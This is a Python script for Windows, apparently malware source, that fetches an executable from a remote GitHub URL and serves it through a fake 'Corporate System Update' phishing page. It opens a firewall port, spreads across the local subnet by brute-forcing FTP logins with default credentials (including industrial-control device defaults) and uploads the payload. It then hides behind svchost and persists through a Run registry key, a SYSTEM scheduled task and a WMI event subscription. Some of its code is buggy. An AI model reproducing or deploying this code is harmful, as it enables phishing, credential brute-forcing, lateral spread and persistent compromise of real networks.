import os
import winreg
import random
import string
import psutil
import subprocess
import socket
import threading
import sys
import requests
import urllib3
import ftplib
from http.server import HTTPServer, BaseHTTPRequestHandler
import wmi
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"
PAYLOAD_PATH = None

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    global PAYLOAD_PATH
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.environ('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
            PAYLOAD_PATH = destination_path
        return destination_path
    except:
        return None

# HTTP server to serve init.exe and update portal
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/update.exe':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
            else: payload_path = download_payload()
            with open(payload_path, 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <html>
                <head>
                    <title>Corporate System Update</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    <!-- Header -->
                    <header class="bg-blue-600 text-white py-4">
                        <div class="container mx-auto px-4">
                            <h1 class="text-2xl font-bold">Corporate IT Services</h1>
                        </div>
                    </header>
                    <!-- Hero Section -->
                    <section class="py-12 text-center">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Critical System Update Required</h2>
                            <p class="text-lg text-gray-600 mb-6">Install the latest update by July 10, 2025, to maintain network access and ensure security compliance.</p>
                            <!-- Fake Progress Bar -->
                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 75%"></div>
                            </div>
                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Update Now</a>
                        </div>
                    </section>
                    <!-- Footer -->
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>&copy; 2025 Corporate IT Services. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))

# Start HTTP server and open firewall
def start_http_server():
    try:
        # Add firewall rule for port 80
        subprocess.run(
            'netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=8080',
            shell=True, capture_output=True, text=True, creationflags=0x08000000  # Hide window
        )
        server = HTTPServer(('0.0.0.0', 8080), HTTPHandler)
        server.serve_forever()
    except:
        pass

# FTP propagation to subnet servers
def ftp_spread():
    try:
        local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
        common_users = [
            'test',
            'abc123',
            'nic2212',
            'PlcmSpIp',
            'accounting',
            '123456',
            'nmt',
            'se',
            'supervisor',
            'Root',
            'MayGion',
            'USER',
            'admin',
            'manager',
            'mysql',
            'password',
            'user',
            'uploader',
            'support',
            'beijer',
            'fdrusers',
            'qwerty',
            'john',
            'nobody',
            'administrator',
            'default',
            'instrument',
            'device',
            'httpadmin',
            'none',
            'ftpuser',
            'pr',
            'anonymous',
            'post',
            'Guest',
            'marketing',
            'mail',
            'hr',
            'User',
            'IEIeMerge',
            'sysdiag',
            'webserver',
            'localadmin',
            'ftp',
            'QNUDECPU',
            'qbf77101',
            'webmaster',
            'apc',
            'ADMIN',
            'dmftp',
            'sa',
            'Admin',
            'postmaster',
            'dm',
            'oracle',
            '111111',
            'adtec',
            'a',
            'root',
            'user1',
            'loader',
            'su',
            'MELSEC',
            'ntpupdate',
            'ftp_boot',
            'pcfactory',
            'sales',
            'www-data',
            'wsupgrade',
            'avery',
        ]
        common_pass = [
            'USER',
            'admin',
            'Janitza',
            'eqidemo',
            'spam',
            'anonymous',
            'supervisor',
            'factorycast@schneider',
            'user00',
            'password',
            '12hrs37',
            '123456',
            'beijer',
            'maygion.com',
            'webadmin',
            'b1uRR3',
            'test2',
            'webmaster',
            'eMerge',
            'pass1',
            'test',
            'test123',
            'nobody',
            'test1',
            'root',
            'news',
            'info',
            'ftp',
            'ntpupdate',
            'webpages',
            'sresurdf',
            'uploader',
            'pcfactory',
            'ZYPCOM',
            'apc',
            'admin12345',
            'mysql',
            'system',
            'none',
            '1111',
            'ftp_boot',
            'MELSEC',
            'guest',
            'nas',
            'hexakisoctahedron',
            'techsupport',
            'localadmin',
            'default',
            'wsupgrade',
            'stingray',
            'dpstelecom',
            'fwdownload',
            'abc123',
            'web',
            'testingpw',
            'ko2003wa',
            'oracle',
            'cvsadm',
            '1234',
            'testing',
            'test4',
            'wago',
            'test3',
            'tester',
            '12345',
            'avery',
            'instrument',
            'user',
            'testuser',
            'fhttpadmin',
            'QNUDECPU',
            '9999',
            'rootpasswd',
            'PlcmSpIp',
            'poiuypoiuy',
            'sysadm'
        ]
        done = False
        for i in range(1, 255):
            ip = f'{local_ip}.{i}'
            for user in common_users:
                if done: break
                done = False
                for pwd in common_pass:
                    try:
                        ftp = ftplib.FTP(ip, timeout=1)
                        ftp.login(user, pwd)
                        random_name = f'{generate_random_name()}.exe'
                        if os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
                        else: payload_path = download_payload()
                        if payload_path:
                            with open(payload_path, 'rb') as f:
                                ftp.storbinary(f'STOR {random_name}', f)
                        ftp.quit()
                        done = True
                        break 
                    except:
                        continue
    except:
        pass

# Hide process by mimicking svchost
def hide_process():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == 'svchost.exe':
            os.environ['COMSPEC'] = proc.exe()
            break

# Persistence via Registry
def persist_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        winreg.SetValueEx(key, generate_random_name(), 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except:
        pass

# Persistence via schtasks
def persist_schtasks():
    task_name = generate_random_name()
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
    subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)  # Hide window

# Persistence via process creation trigger
def persist_process_trigger():
    try:
        connection = wmi.WMI()
        event_filter = connection.__EventFilter(
            Name=generate_random_name(),
            Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
        )
        consumer = connection.Win32_CommandLineEventConsumer(
            Name=generate_random_name(),
            CommandLineTemplate=f'"{sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)}"'
        )
        connection.__FilterToConsumerBinding(
            Filter=f"__EventFilter.Name='{event_filter.Name}'",
            Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
        )
    except:
        pass

# Main execution
if __name__ == '__main__':
    import sys
    download_payload()
    start_http_server()
    ftp_spread()
    hide_process()
    persist_registry()
    persist_schtasks()
    persist_process_trigger()